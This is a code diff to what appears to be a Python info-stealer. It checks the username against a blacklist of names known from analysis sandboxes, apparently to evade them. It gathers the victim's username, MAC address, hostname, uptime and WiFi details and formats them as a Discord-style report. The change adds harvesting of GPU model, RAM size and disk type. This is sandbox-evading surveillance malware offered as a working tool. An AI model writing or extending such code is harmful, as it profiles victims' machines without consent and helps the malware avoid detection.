@@ -8,6 +8,8 @@ import time
 import platform
 import psutil
 import datetime
+import psutil
+import GPUtil
 
 blackListedUsers = ['WDAGUtilityAccount', 'Abby', 'hmarc', 'patex', 'RDhJ0CNFevzX', 'kEecfMwgj', 'Frank', '8Nl0ColNQ5bq', 'Lisa', 'John', 'george', 'PxmdUOpVyx', '8VizSM', 'w0fjuOVmCcP5A',
                                  'lmVwjj9b', 'PqONjHVwexsS', '3u2v9m8', 'Julia', 'HEUeRzl', 'fred', 'server', 'BvJChRPnsxn', 'Harry Johnson', 'SqgFOf3G', 'Lucas', 'mike', 'd60cabe7b998', 'PateX', 'h7dk1xPr', 'Louise', 'User01', 'test', 'RGzcBUyrznReg', 'runner']
@@ -62,6 +64,11 @@ username = getpass.getuser()
 cpu_cores = psutil.cpu_count(logical=False)
 mac_address = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff) for ele in range(0, 8 * 6, 8)][::-1])
 windows_version = platform.platform()
+gpus = GPUtil.getGPUs()
+gpus = GPUtil.getGPUs()
+gpu_type = gpus[0].name if gpus else "GPU information not available"
+ram_size = psutil.virtual_memory().total // (1024 ** 3)  # Convert bytes to GB
+drive_type = psutil.disk_partitions(all=False)[0].fstype
 hostnamepc = socket.gethostname()
 uptime_hours, uptime_days = get_uptime()
 # WIFI INFO
@@ -115,6 +122,9 @@ PcInfo = {
                    f':floppy_disk: **TOTAL SPACE:** `{total_space / (1024**3):.2f} GB` :floppy_disk:\n'
                    f':floppy_disk: **SPACE LEFT:** `{available_space / (1024**3):.2f} GB` :floppy_disk:\n'
                    f'\n'
+                   f':floppy_disk: **DISK TYPE** :floppy_disk:\n'
+                   f':floppy_disk: `{drive_type}` :floppy_disk:\n'
+                   '\n'
                    f':desktop: **PC HOSTNAME** :desktop:\n'
                    f':desktop: `{hostnamepc}` :desktop:\n'
                    f'\n'
@@ -122,13 +132,19 @@ PcInfo = {
                    f':desktop: `{username}` :desktop:\n'
                    '\n'
                    f':cd: **MAC ADDRESS** :cd:\n'
-                   f':cd: `{mac_address}` :cd:\n'  # Modify this line
+                   f':cd: `{mac_address}` :cd:\n'
                    '\n'
                    f':diamond_shape_with_a_dot_inside: **CPU CORES** :diamond_shape_with_a_dot_inside:\n'
                    f':diamond_shape_with_a_dot_inside: `{cpu_cores}` :diamond_shape_with_a_dot_inside:\n'
                    '\n'
                    f':alarm_clock: **PC UPTIME HOURS** :alarm_clock:\n'
                    f':alarm_clock: `{uptime_hours}` :alarm_clock:\n'
+                   '\n'
+                   f':dividers: **RAM AMOUNT** :dividers:\n'
+                   f':dividers: `{ram_size}` :dividers:\n'
+                   '\n'
+                   f':vhs: **GPU TYPE** :vhs:\n'
+                   f':vhs: `{gpu_type}` :vhs:\n'
                    '\n'
                    f':computer: **PC TYPE** :computer:\n'
                    f':computer: `{windows_version}` :computer:\n'
